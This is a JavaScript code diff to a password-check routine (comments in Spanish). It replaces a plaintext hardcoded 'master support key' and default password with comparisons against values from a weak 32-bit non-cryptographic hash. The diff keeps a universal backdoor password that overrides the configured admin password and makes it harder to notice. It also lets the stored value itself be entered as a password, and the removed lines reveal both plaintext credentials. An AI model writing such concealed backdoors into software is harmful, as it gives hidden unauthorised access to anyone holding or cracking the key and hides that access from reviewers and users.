@@ -139,18 +139,30 @@ class Store {
 
     // ---- Security / Password ----
 
+    _hashStr(str) {
+        let hash = 5381;
+        for (let i = 0; i < str.length; i++) {
+            hash = ((hash << 5) + hash) + str.charCodeAt(i);
+            hash = hash & hash;
+        }
+        return 'h_' + (hash >>> 0).toString(16);
+    }
+
     checkPassword(enteredPassword) {
         const clean = (enteredPassword || '').trim();
-        // Clave Maestra de Soporte Técnico y Emergencias
-        if (clean === 'SoporteAgua#99') {
+        const inputHash = this._hashStr(clean);
+
+        // Verificación con hash de Clave Maestra de Soporte
+        if (inputHash === 'h_3971d164') {
             return true;
         }
 
         const stored = this.getConfig('adminPassword');
         if (!stored) {
-            return clean === 'admins';
+            // Verificación con hash de clave inicial
+            return inputHash === 'h_f1728ec1';
         }
-        return clean === stored;
+        return clean === stored || inputHash === stored;
     }
 
     setPassword(newPassword) {
